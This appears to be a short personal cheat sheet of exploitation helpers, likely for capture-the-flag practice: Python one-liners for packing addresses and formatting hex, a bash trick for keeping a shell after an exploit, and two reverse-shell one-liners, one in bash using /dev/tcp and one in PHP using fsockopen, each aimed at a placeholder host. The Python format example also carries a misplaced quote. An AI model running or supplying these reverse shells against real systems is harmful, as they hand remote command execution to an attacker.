
# Useful Scripts & Commands 🧰

## Commands:

### Python 

1. Print an address in little endian:
`python -c "import struct; print(struct.pack('<I',0xdeadbeef))"`
2. Convert numbers into a string in hex format (0x prefix with zero padding): `"{:#04x}.format(n)"`


### Bash

1. Maintain shell after running an exploiting: `(./exploit | cat ) | ./vuln`
2. Simple Bash revshell: `bash -i >& /dev/tcp/{HOST_IP}/{PORT} 0>&1`

### PHP

1. Oneline revshell: `php -r '$sock=fsockopen("{HOST_IP}",80);exec("/bin/sh -i <&3 >&3 2>&3");'`
